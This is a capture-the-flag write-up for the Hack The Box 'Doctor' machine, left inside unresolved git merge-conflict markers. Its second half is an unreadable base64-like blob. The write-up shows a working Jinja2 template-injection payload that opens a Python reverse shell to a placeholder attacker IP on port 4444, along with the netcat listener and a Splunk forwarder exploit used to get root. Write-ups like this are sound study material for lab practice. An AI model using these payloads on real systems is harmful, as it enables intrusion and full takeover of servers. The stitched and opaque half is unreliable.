<<<<<<< Updated upstream
# User access

## Scan

As always I started by running nmap on the target IP in search of open ports

![](/doctor/img/nmap.PNG)

This is a Linux machine and ports 22, 80 and 8089 are open, this is more than enough. I proceeded by visiting the webserver on port 80 and running gobuster looking for some useful directories.

## Enumeration

There's nothing interesting enumerating the webserver's directories, I used a small wordlist, you can try something bigger but I didn't need this anyway.

![](/doctor/img/dirb.PNG)

## Webserver

This is the website homepage, there is nothing really interesting except for a domain named **doctors.htb**

![](/doctor/img/webserver.PNG)

## Virtual host

I added _doctors.htb_ into my **/etc/hosts** file and visited the URL again, now there's **actually** something interesting: a login page!

![](/doctor/img/login.PNG)

At this point I thought that I might have found something more useful enumerating the directories. So I ran gobuster once again.

![](/doctor/img/dirb-vhost.PNG)

Nothing out of the ordinary, apparently. I noticed an _archive_ folder and explored in the URL. Nothing happens but it's quite suspicious.

## Messing up with login/register page

I've tried some simple SQL injection but nothing worked, so I started looking around for other pages, I first checked the register page. Is a simple form, I didn't find anything interesting, XSS doesn't work and there are no exploitable file uploads either. At this point I tried to register a new user.

At this point you are redirected to the homepage, there is a section when you can submit a post with a title and a content. The post will be shown on the homepage.

![](/doctor/img/board.PNG) ![](/doctor/img/homepage.PNG)

I think there might be a vulnerability here somewhere, so I documented myself about how exploiting form submissions and I found an interesting document about **Server-side Template Injection** (SSTI). You can find a nicely documented methodology on [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).

Now we might have a initial foothold on what to do on this machine.

## Exploiting the template

By looking the graph in the previous repo (under the "Methodology" section) there is a nice [flowchart](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png) where we notice how we can exploit a template by injecting some values in order to find if they are processed and, at the end, discover which framework is running under the webserver.

The real question now is: **where should the expressions be evaluated?** Looking around I remembered the **archive** directory I found while enumerating. So I wrote a very simple payload based on the flowchart and checked out the archive directory. Bingo!

![](/doctor/img/example-payload.PNG)  

This was the result of the expression:

![](/doctor/img/example-payload2.PNG)

After a couple of attempts following the flowchart I found that the framework under the hood is Jinja2, which is written in Python. This is a very useful information as I'm now aware of the language I have to use if I want to write and run payloads.

What I had to do was to write a python payload in order to open a shell on my machine.

## Writing the payload

This is honestly the part where I struggled the most. Mostly because I didn't know the Jinja engine. The first part was to write a python script in order to run simple commands, so I tried things like {{import os; os.system("whoami");}} but nothing worked. Since I was stuck on this part I asked help to users on HTB chats and forums for a nudge. I found this piece of conversation to be somehow helpful.

![](/doctor/img/chat.PNG)

I was actually missing that the script were ran under a backend engine, so I needed to "crawl" into the engine context in order to require the objects and the methods that I needed to run my payload.

While digging on the internet I found an interesting article about [SSTI on Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/). Here you can find a simple explanation about MRO (which is a way you can exploit in order to run your payload) and the global variables stored into jinja's context. In particular we have the **request** object, from which we can write something like this:

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

<table style="border: 1px;"></table>

From this stub we can write the payload we need in order to open a shell on our machine. Some basic socket code did the trick for me. This was the code I used:

```python
import socket, os, pty  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a basic socket with ipv4 addresses and TCP protocol  
s.connect(("x.x.x.x", 4444)) # connect to your local machine using port 4444  
os.dup2(s.fileno(), 0) # duplicate the socket descriptor on your standard input (0), standard output (1) and standard error (2), in order to display commands output on your terminal  
os.dup2(s.fileno(), 1)  
os.dup2(s.fileno(), 2)  
pty.spawn("/bin/sh") # spawn a shell on your terminal  
```

put this code (without the # comments) in the popen() function, calling the script using "python3 -c". This should be your final payload:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('python3 -c '\ import socket, os, pty; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("x.x.x.x", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn("/bin/sh"); \'').read()}}
```

## Shell and privesc

Obviously no shell will spawn unless you put your machine on listening on an external port, so I ran netcat in listening mode on port 4444. Ran the URL on the /archive endpoint, a shell will spawn on your terminal!

![](/doctor/img/shell.PNG)

By enumerating on the machine we can find some useful information. There are 2 users, _web_ and _shaun_, and we are logged as the first one. As web, we can't do anything except looking for interesting files. I followed [this guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) for basic privesc commands and in the /var/log/apache2/ directory I found a file named "backup". By displaying its content on screen I finally found a password!

![](/doctor/img/user_password.PNG)

...Or at least it looks like one. The first thing I tried is to switch from web to shaun. So I used the _su_ command using the password I found, aaaaand we are in! Right now we can search for the user.txt flag, it's located in the /home/shaun directory, so we cat the content and we finally have user.

![](/doctor/img/user-txt.PNG)

# From user to root

I found this part easier than user, I didn't had much informations, but there was one service that I didn't even checked: **the splunk service on port 8089**. Since I didn't found nothing useful by navigating on the service via browser, I searched on the internet for a privesc tool and I found [this one](https://github.com/cnotin/SplunkWhisperer2) that exploits misconfigurations on the service. Before using this tool, I suggest to read [here](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) in order to fully comprehend the vulnerability you are exploiting.

By the way, in order to use this tool, I cloned the repository, opened another terminal window and ran nc on port 9999 and used the PySplunkWhisperer_remote script following the usage instructions. The script did everything for me, and on the netcat window I had a shell as root!

![](/doctor/img/root_shell.PNG)  

![](/doctor/img/root_shell2.PNG)
=======
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
>>>>>>> Stashed changes
